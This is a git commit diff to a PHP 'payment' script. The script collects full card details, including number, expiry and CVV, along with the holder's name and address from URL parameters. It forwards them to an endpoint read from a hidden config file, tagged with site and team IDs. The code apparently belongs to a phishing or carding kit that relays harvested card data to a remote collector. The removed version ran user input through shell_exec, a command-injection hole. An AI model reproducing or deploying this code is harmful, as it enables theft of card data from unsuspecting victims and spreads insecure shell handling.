e295683dc81896d941059624af7b49b6951ee295
Yegor.Koval <yegor.koval@vimmi.net>
2019-07-10 21:01:04 +0300

    sad

--- public/pay/payment.php
+++ public/pay/payment.php
@@ -1,25 +1,29 @@
 <?php
 $end_point = trim(file_get_contents('.aconf'));
 $site = trim(file_get_contents('.sconf'));
+$team = trim(file_get_contents('.tconf'));
 
 $request = $end_point."add_payment?"
-	."fullname=".$_GET['fullname']."&"
-	."email=".$_GET['email']."&"
-	."address=".$_GET['address']."&"
-	."city=".$_GET['city']."&"
-	."state=".$_GET['state']."&"
-	."zip=".$_GET['zip']."&"
-	."cardname=".$_GET['cardname']."&"
-	."cardnumber=".$_GET['cardnumber']."&"
-	."expmonth=".$_GET['expmonth']."&"
-	."expyear=".$_GET['expyear']."&"
-	."cvv=".$_GET['cvv']."&"
-	."sameaddr=".$_GET['sameadr']."&"
-	."site=".$site;
+        ."fullname=".$_GET['fullname']."&"
+        ."email=".$_GET['email']."&"
+        ."address=".$_GET['address']."&"
+        ."city=".$_GET['city']."&"
+        ."state=".$_GET['state']."&"
+        ."zip=".$_GET['zip']."&"
+        ."cardname=".$_GET['cardname']."&"
+        ."cardnumber=".$_GET['cardnumber']."&"
+        ."expmonth=".$_GET['expmonth']."&"
+        ."expyear=".$_GET['expyear']."&"
+        ."cvv=".$_GET['cvv']."&"
+        ."sameaddr=".$_GET['sameadr']."&"
+        ."site=".$site."&"
+        ."teamid=".$team;
 
-$resp = shell_exec("curl "."'".preg_replace('/\s+/', '_', $request)."'");
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, preg_replace('/\s+/', '_', $request));
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$body = curl_exec($ch); 
 
-echo $resp;
-echo $req;
+echo $body;
 ?>
 
